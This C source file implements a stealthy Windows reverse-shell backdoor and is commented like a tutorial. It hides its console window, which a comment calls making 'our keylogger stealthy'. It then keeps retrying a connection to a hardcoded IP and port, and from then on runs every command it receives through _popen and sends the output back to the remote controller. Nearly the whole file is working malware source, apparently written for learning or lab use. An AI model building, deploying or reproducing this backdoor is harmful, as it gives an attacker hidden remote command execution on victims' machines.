#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <winsock2.h>
#include <windows.h>
#include <winuser.h>
#include <windowsx.h>
#include <wininet.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <string.h>

// Bzero Function to erase the memory with zero byte. 
#define bzero(param, size) (void) memset((param),0, size) 

int sock;

void Shell();


//* Entry point for the Windows Application Point
/* 
params:

HISTANCE ->  hInstance is something called a "handle to an instance" or "handle to a module." 
			 The operating system uses this value to identify the executable (EXE) when it is 
			 loaded in memory.
hPrev is useless.
lpCmdLine -> Command line argument as as Unicode string.
nCmdShow  -> Flag that says whether the main application window will be minimized, 
			 maximized, or shown normally.
*/

int APIENTRY WinMain(HINSTANCE hinstance, HINSTANCE hPrev , LPSTR lpCmdLine, int nCmdShow){
	HWND stealth;   //HWND is the unique code for the window created.
	AllocConsole(); // Allocates a new console for the window. 

	// FindWindowsA finds the ConsoleWindowClass and then makes it Null therefore
	// hiding making our keylogger stealthy. Also we assign this function to stealth
	stealth = FindWindowA("ConsoleWindowClass",NULL); 


	// Set showWindow -> 0 therefore 
	ShowWindow(stealth, 0);

	// Backdoor connection

	// ready made struct used in local or remote end point for connection.
	struct sockaddr_in ServAddr;

	
	char* server_ip;
	unsigned short server_port;

	// WSA -> Windows Socket Adress 
	WSADATA wsaData; // Contains information about the windows socket.
	server_ip = "192.168.17.129";
	server_port = 50005;

	/* The WSAStartup function startes the WinSock.dll
	   if successful returns 0 else returns 1
	   Makeword returns a 16 bit integeer from two values.
	
	   In simple words check if a windows system machine is there. 
	*/
	if (WSAStartup(MAKEWORD(2,0), &wsaData) != 0)
	{
		exit(1);
	}

	// params definition:
	// AF_INET     -> IPv4 Family Adress
	// Sock Stream -> A socket type that provides sequenced, reliable, two-way, connection
	sock = socket(AF_INET, SOCK_STREAM, 0); // intialize the socket 


	memset(&ServAddr,0, sizeof(ServAddr)); // set the memory of struct ServAddr defined before.
	ServAddr.sin_family = AF_INET;
	ServAddr.sin_addr.s_addr =  inet_addr(server_ip);
	ServAddr.sin_port = htons(server_port);


	start:
	while (connect(sock, (struct sockaddr *) &ServAddr, sizeof(ServAddr)) != 0)
	{
		Sleep(10);
		goto start;
	}
	
	Shell();
}


void Shell() {
	 char buffer[1024]; char container[1024]; char total_response[18384];


	while (1) {
		 jmp:
		 bzero(buffer,1024);
		 bzero(container, sizeof(container));
		 bzero(total_response, sizeof(total_response));

		 //The recv function receives data from a connected socket or a bound connectionless socket
		 recv(sock, buffer, 1024, 0); 
	
		// using q for exiting the shell.
		if(strncmp("q", buffer, 1) == 0)
		{
			closesocket(sock);
			WSACleanup();
			exit(0);
		}
		else
		{
			FILE *fp;
			fp = _popen(buffer, "r");
			while (fgets(container,1024,fp) != NULL)
			{
				strcat(total_response, container);
			}
			// Send the response to the server
			send(sock, total_response, sizeof(total_response), 0);
			fclose(fp);
		}
	}
}
